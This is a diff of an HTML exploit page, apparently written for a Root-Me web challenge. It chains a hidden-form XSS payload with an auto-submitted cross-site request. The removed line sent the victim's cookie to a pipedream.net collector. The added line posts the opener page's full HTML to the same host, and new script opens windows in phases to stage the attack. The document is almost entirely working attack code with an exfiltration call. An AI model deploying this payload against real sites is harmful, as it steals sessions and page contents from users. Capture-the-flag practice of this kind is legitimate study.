@@ -14,7 +14,7 @@
             <input
                 type="text"
                 name="username"
-                value="<script>window.location = 'https://en751j6eplzxc.x.pipedream.net/'+document.cookie</script>"
+                value="<script>fetch('https://en751j6eplzxc.x.pipedream.net/', {method: 'post',body: opener.document.documentElement.innerHTML})</script>"
                 hidden
             />
             <input type="text" name="secret" value="secsecsec" hidden />
@@ -22,6 +22,14 @@
         </form>
     </body>
     <script>
-        document.forms["payload"].submit();
+        const phase = location.hash.replace("#", "");
+        if (phase === "1") {
+            open("http://localhost:5001#2");
+            location = "http://challenge01.root-me.org:58003/profile";
+        } else if (phase === "2") {
+            setTimeout(() => {
+                document.forms["payload"].submit();
+            }, 1000);
+        }
     </script>
 </html>
